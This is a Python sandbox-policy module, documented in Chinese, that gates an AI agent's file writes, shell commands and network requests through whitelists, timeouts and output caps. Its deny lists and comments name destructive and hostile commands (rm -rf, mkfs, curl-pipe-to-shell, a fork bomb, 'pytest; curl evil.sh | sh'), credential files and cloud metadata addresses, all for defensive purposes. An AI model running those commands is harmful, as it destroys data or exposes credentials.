"""执行边界（W8 D4）：三道白名单 + 超时 + 输出上限。

我们有 `run_command` / `write_file` 这类能力，就必须回答"它能碰什么"。
完整容器隔离需要容器权限，CI 里跑不了，所以本周做**本地级**边界：
契约先立住，容器化留到 W11（`SandboxPolicy(level="container")` 届时换实现，
调用方不用改）。

三条边界，每条都配一个"为什么默认拒绝"的理由：

| 边界 | 默认策略 | 为什么不能反过来 |
|---|---|---|
| 路径 | 只允许 root 子树写入；`.ssh` / `.env*` / `.git/config` 硬拒 | 默认放开= 全盘可写 |
| 命令 | 前缀白名单 + 参数黑名单 + **禁止链式符号** | 只做前缀匹配时 `pytest && rm -rf /` 放行 |
| 网络 | 默认拒绝；域名白名单；内网/元数据地址硬拒 | 只做域名白名单挡不住 `169.254.169.254` |

两个实现纪律：

1. **检查必须在副作用之前。** 文件已经写了、进程已经起了再判断越界，
   等于只有日志没有边界。所以 `check_*` 是独立的、纯函数式的判定，
   `run_command` 进门第一件事就是 `check_command`。
2. **三类拒绝必须是可断言的稳定码**（`path_denied` / `command_denied` /
   `network_denied`），否则"边界"只是代码里一段没人测过的 if。
   `evals/scripts/tool_boundary_check.py` 就是拿这三个码做断言的。

一个刻意的粗糙：命令解析不做完整 shell 语法分析（那需要一个解析器），
而是**先拒绝所有可能改变语义的符号**，再对单条命令做前缀匹配。
宁可错拒一条合法命令（用户会来问），也不放过一条拼接命令（没人会发现）。
"""

from __future__ import annotations

import asyncio
import fnmatch
import logging
import os
import re
import signal
from dataclasses import dataclass
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

__all__ = [
    "DENY_NETWORK_HOSTS",
    "PATH_DENIED",
    "COMMAND_DENIED",
    "NETWORK_DENIED",
    "CommandResult",
    "SandboxDecision",
    "SandboxLimits",
    "SandboxPolicy",
]

PATH_DENIED = "path_denied"
COMMAND_DENIED = "command_denied"
NETWORK_DENIED = "network_denied"

# 无论如何都不许碰的名字（按文件名 glob 与路径片段两个维度匹配）。
# 这里放的是"拿到就等于拿到全部"的东西：私钥、环境变量、git 凭据。
DENY_NAME_GLOBS = (
    ".env",
    ".env.*",
    "*.pem",
    "*.key",
    "id_rsa",
    "id_ed25519",
    ".netrc",
    ".npmrc",
    ".pypirc",
)
DENY_PATH_PARTS = (".ssh", ".aws", ".gnupg")
# `.git/config` 单独列：它含 remote 里的凭据，但 `.git` 整个目录不能全禁
# （`git status` 要读它）。
DENY_RELATIVE = (".git/config", ".git/hooks")

# 内网与云元数据地址。`169.254.169.254` 是 AWS/GCP/Azure 的实例元数据服务，
# 一次 SSRF 就能换到整台机器的临时凭据，所以它是硬拒而不是"走白名单"。
DENY_NETWORK_HOSTS = frozenset(
    {
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
        "::1",
        "169.254.169.254",
        "metadata.google.internal",
    }
)
_PRIVATE_HOST_RE = re.compile(
    r"^(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}"
    r"|192\.168\.\d{1,3}\.\d{1,3}"
    r"|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})$"
)

# 参数级黑名单。前缀白名单挡不住 `git push --force`：`git push` 若是白名单
# 前缀，那么 `git status` 与 `git push --force` 在匹配层面没有差别。
DENY_COMMAND_PATTERNS = (
    r"\brm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+",
    r"\bmkfs(\.\w+)?\b",
    r"\bdd\s+if=",
    r"\bsudo\b",
    r"\bsu\b",
    r"\bcurl\b[^|]*\|\s*(?:ba)?sh\b",
    r"\bwget\b[^|]*\|\s*(?:ba)?sh\b",
    r"\bgit\s+push\b",
    r"--force\b",
    r"\bchmod\s+777\b",
    r"\b:\(\)\s*\{",  # fork bomb
    r">\s*/dev/sd",
    r"\bshutdown\b|\breboot\b",
    r"\bkill(all)?\s+-9\s+1\b",
)
_DENY_COMMAND_RES = tuple(re.compile(pattern) for pattern in DENY_COMMAND_PATTERNS)

# 链式/替换符号：出现即拒。`pytest; rm -rf /` 与 `pytest` 在前缀匹配上
# 完全一样，这是"前缀白名单"这类方案最大的洞。
CHAIN_SYMBOLS = (";", "&&", "||", "|", "`", "$(", ">", "<", "\n")


@dataclass(frozen=True, slots=True)
class SandboxDecision:
    """一次边界判定。`code` 为空串表示放行。"""

    allowed: bool
    code: str = ""
    detail: str = ""

    @property
    def denied(self) -> bool:
        return not self.allowed


@dataclass(frozen=True, slots=True)
class SandboxLimits:
    """资源上限。默认值按"CI 里不会把日志刷爆"定。"""

    # 硬超时（秒）。`yes` 这类命令会一直输出，靠输出上限兜不住 CPU 时间。
    timeout_s: float = 15.0
    # 输出上限（字符）。超出后截断并标 `truncated=True`——
    # 不设上限时 `yes` 能在几秒内产生几个 GB，先把磁盘写满。
    max_output_chars: int = 20_000


@dataclass(frozen=True, slots=True)
class CommandResult:
    """命令执行结果。**不**带 shell 的原始字节，只带文本与状态。"""

    command: str
    returncode: int = -1
    stdout: str = ""
    stderr: str = ""
    truncated: bool = False
    timed_out: bool = False
    # 被边界拦下时非空（此时没有真的执行）。
    denied_code: str = ""
    denied_detail: str = ""

    @property
    def ok(self) -> bool:
        return self.denied_code == "" and not self.timed_out and self.returncode == 0


class SandboxPolicy:
    """本地级执行边界。构造一次、全程复用（不可变配置）。"""

    def __init__(
        self,
        *,
        write_roots: tuple[str | Path, ...] = (),
        command_prefixes: tuple[str, ...] = (),
        network_allow: tuple[str, ...] = (),
        limits: SandboxLimits | None = None,
        extra_deny_names: tuple[str, ...] = (),
    ) -> None:
        # 解析成绝对路径并去重：`check_path` 每次都要做 `is_relative_to`，
        # 用解析后的形式比较才有意义（否则 `/repo/../etc` 会绕过）。
        self._roots = tuple(Path(root).expanduser().resolve() for root in write_roots)
        self._prefixes = tuple(_normalize_command(p) for p in command_prefixes)
        self._network_allow = tuple(host.lower() for host in network_allow)
        self._deny_names = DENY_NAME_GLOBS + tuple(extra_deny_names)
        self.limits = limits or SandboxLimits()

    # -- 路径 -------------------------------------------------------------- #

    @property
    def roots(self) -> tuple[Path, ...]:
        """允许的根目录（只读访问，给排障打印用）。"""
        return self._roots

    def check_path(self, path: str | Path, *, write: bool = True) -> SandboxDecision:
        """路径判定。`write=False` 时只判"是否在允许的可读范围内"。

        `resolve()` 会展开 `..` 与符号链接——**符号链接是这条路最容易被绕的点**：
        `repo/link -> /etc` 在字符串比较下完全合法，`resolve()` 之后才露馅。

        相对路径按**第一个 root** 解析：工具参数里的 `briefs/a.md` 是相对
        工作区的，不是相对进程 cwd 的。这两者混用是"本地跑得通、容器里写到
        根目录"的经典来源。
        """
        if not self._roots:
            return SandboxDecision(
                False, PATH_DENIED, "未配置 write_roots：默认不允许任何文件访问"
            )

        candidate = Path(path).expanduser()
        if not candidate.is_absolute():
            candidate = self._roots[0] / candidate
        try:
            resolved = candidate.resolve()
        except (OSError, RuntimeError) as exc:  # 符号链接循环等
            return SandboxDecision(False, PATH_DENIED, f"路径无法解析：{exc}")

        for root in self._roots:
            if resolved == root or resolved.is_relative_to(root):
                break
        else:
            return SandboxDecision(
                False, PATH_DENIED, f"{resolved} 不在允许的根目录内"
            )

        # 名字维度：任何一级目录命中也算（`repo/.ssh/id_rsa` 要挡住）。
        for part in resolved.parts:
            if any(fnmatch.fnmatch(part, pattern) for pattern in self._deny_names):
                return SandboxDecision(False, PATH_DENIED, f"命中敏感文件名：{part}")
            if part in DENY_PATH_PARTS:
                return SandboxDecision(False, PATH_DENIED, f"命中敏感目录：{part}")

        for root in self._roots:
            if resolved.is_relative_to(root):
                relative = resolved.relative_to(root).as_posix()
                for blocked in DENY_RELATIVE:
                    if relative == blocked or relative.startswith(f"{blocked}/"):
                        return SandboxDecision(
                            False, PATH_DENIED, f"命中敏感相对路径：{blocked}"
                        )

        if write and resolved.exists() and resolved.is_dir():
            # 目录可以写，但我们要的是"写文件"——交给调用方决定写哪个子文件，
            # 不在这里替它猜名字。
            return SandboxDecision(True)

        return SandboxDecision(True)

    # -- 命令 -------------------------------------------------------------- #

    def check_command(self, command: str) -> SandboxDecision:
        """命令判定：链式符号 → 黑名单 → 前缀白名单。顺序不能换。

        先拒符号：`pytest; rm -rf /` 如果在黑名单里只匹配到 `rm -rf`
        （能匹配），但如果写的是 `pytest; curl evil.sh | sh`，符号检测
        是唯一在"前缀层"就能拦住的地方。
        """
        raw = (command or "").strip()
        if not raw:
            return SandboxDecision(False, COMMAND_DENIED, "空命令")

        for symbol in CHAIN_SYMBOLS:
            if symbol in raw:
                return SandboxDecision(
                    False,
                    COMMAND_DENIED,
                    f"命令含链式/重定向符号 {symbol!r}：只允许单条命令",
                )

        for pattern in _DENY_COMMAND_RES:
            if pattern.search(raw):
                return SandboxDecision(False, COMMAND_DENIED, f"命中禁止模式 {pattern.pattern}")

        if not self._prefixes:
            return SandboxDecision(
                False, COMMAND_DENIED, "未配置 command_prefixes：默认不允许执行任何命令"
            )

        normalized = _normalize_command(raw)
        for prefix in self._prefixes:
            if normalized == prefix or normalized.startswith(f"{prefix} "):
                return SandboxDecision(True)

        return SandboxDecision(
            False, COMMAND_DENIED, f"不在白名单前缀内；允许 {list(self._prefixes)}"
        )

    # -- 网络 -------------------------------------------------------------- #

    def check_network(self, url: str) -> SandboxDecision:
        """出网判定。默认拒绝；白名单按域名后缀匹配。"""
        try:
            parts = urlsplit(url)
        except ValueError:
            return SandboxDecision(False, NETWORK_DENIED, "URL 无法解析")

        if parts.scheme not in {"http", "https"}:
            return SandboxDecision(
                False, NETWORK_DENIED, f"只允许 http/https，收到 {parts.scheme!r}"
            )

        host = (parts.hostname or "").lower()
        if not host:
            return SandboxDecision(False, NETWORK_DENIED, "URL 缺少主机名")

        if host in DENY_NETWORK_HOSTS or _PRIVATE_HOST_RE.match(host):
            # 硬拒在前：即使有人把内网地址写进白名单，也不放行。
            # "允许访问元数据服务"这种事没有任何正当用例。
            return SandboxDecision(False, NETWORK_DENIED, f"内网/元数据地址硬拒：{host}")

        if not self._network_allow:
            return SandboxDecision(False, NETWORK_DENIED, "未配置域名白名单：默认拒绝出网")

        for allowed in self._network_allow:
            if host == allowed or host.endswith(f".{allowed}"):
                return SandboxDecision(True)

        return SandboxDecision(
            False, NETWORK_DENIED, f"{host} 不在白名单；允许 {list(self._network_allow)}"
        )

    # -- 统一入口 ---------------------------------------------------------- #

    def check(
        self,
        *,
        path: str | Path | None = None,
        command: str | None = None,
        url: str | None = None,
    ) -> SandboxDecision:
        """按传入的维度逐个判定，**返回第一个拒绝**。

        不做"全部检查后汇总"：调用方要的是一个明确的拒绝理由，
        多个理由并存会让报告出现互相矛盾的归因（W7 六类原因的同一条纪律）。
        """
        checks: list[SandboxDecision] = []
        if command is not None:
            checks.append(self.check_command(command))
        if path is not None:
            checks.append(self.check_path(path))
        if url is not None:
            checks.append(self.check_network(url))

        for decision in checks:
            if decision.denied:
                return decision
        return SandboxDecision(True)

    # -- 执行 -------------------------------------------------------------- #

    async def run_command(
        self, command: str, *, cwd: str | Path | None = None
    ) -> CommandResult:
        """执行一条已通过边界的命令。

        **进门先判**（纪律 1）：不信任调用方已经判过——多判一次的成本是
        一次字符串匹配，漏判的成本是"沙箱只是日志"。
        """
        decision = self.check_command(command)
        if decision.denied:
            return CommandResult(
                command=command, denied_code=decision.code, denied_detail=decision.detail
            )

        if cwd is not None:
            cwd_decision = self.check_path(cwd, write=False)
            if cwd_decision.denied:
                return CommandResult(
                    command=command,
                    denied_code=cwd_decision.code,
                    denied_detail=f"cwd {cwd_decision.detail}",
                )

        # 环境变量收敛到最小集：`start_new_session=True` 让子进程有自己的
        # 进程组，超时时可以整组杀掉（否则 `sh -c "cmd"` 的子进程会活下来）。
        env = {
            "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
            "LANG": "C.UTF-8",
            # 不继承任何带 KEY/TOKEN 的变量：命令是模型选的，它不该看见凭据。
        }
        process = await asyncio.create_subprocess_shell(
            command,
            cwd=str(cwd) if cwd is not None else None,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env,
            start_new_session=True,
        )

        timed_out = False
        try:
            stdout_b, stderr_b = await asyncio.wait_for(
                process.communicate(), timeout=self.limits.timeout_s
            )
        except TimeoutError:
            timed_out = True
            _terminate_group(process)
            try:
                stdout_b, stderr_b = await asyncio.wait_for(process.communicate(), timeout=2.0)
            except (TimeoutError, ProcessLookupError):
                stdout_b, stderr_b = b"", b""

        stdout, stdout_cut = _cap(stdout_b, self.limits.max_output_chars)
        stderr, stderr_cut = _cap(stderr_b, self.limits.max_output_chars // 4)

        return CommandResult(
            command=command,
            returncode=process.returncode if process.returncode is not None else -1,
            stdout=stdout,
            stderr=stderr,
            truncated=stdout_cut or stderr_cut,
            timed_out=timed_out,
        )


def _normalize_command(command: str) -> str:
    """折叠空白。`pytest    -q` 与 `pytest -q` 必须命中同一条前缀。"""
    return re.sub(r"\s+", " ", (command or "").strip())


def _terminate_group(process: Any) -> None:
    """杀整个进程组。只 kill 父进程会留下孙子进程占着管道（`communicate`
    永远返回不了），这是超时处理里最常见的坑。"""
    pid = getattr(process, "pid", None)
    if not isinstance(pid, int):
        return
    try:
        os.killpg(os.getpgid(pid), signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        try:
            process.kill()
        except ProcessLookupError:
            logging.getLogger(__name__).debug("process already gone: pid=%s", pid)


def _cap(raw: bytes, limit: int) -> tuple[str, bool]:
    """字节 → 文本并截断。先解码再截断，避免把多字节汉字切成半个。"""
    text = raw.decode("utf-8", errors="replace")
    if len(text) <= limit:
        return text, False
    return text[:limit], True
